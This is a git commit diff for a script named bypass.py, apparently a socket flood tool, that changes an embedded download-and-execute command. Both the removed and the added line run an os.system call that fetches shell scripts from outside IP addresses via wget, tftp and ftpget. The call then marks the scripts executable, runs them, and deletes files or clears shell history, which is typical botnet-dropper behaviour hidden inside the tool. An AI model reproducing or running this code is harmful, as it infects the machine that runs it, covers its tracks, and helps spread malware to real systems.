be31d38b5cc3fe2371533b7ae9ac75cef450aff8
BLACKNET CYBER <65501687+BlackQuard@users.noreply.github.com>
2022-05-14 08:47:24 +0200

    Update bypass.py

--- bypass.py
+++ bypass.py
@@ -10,7 +10,7 @@ threads = int(input("Enter threads: "))
 def sender():
   sock = socket.socket()
   sock.connect((ip, port))
-  os.system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.105.180.88/SnOoPy.sh; chmod 777 *; sh SnOoPy.sh; tftp -g 172.105.180.88 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c")
+  os.system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.201.32.187/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 195.201.32.187 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 195.201.32.187; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 195.201.32.187 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *")
   sock.sendall(b"SYN=0")
   sock.close()
   sender()
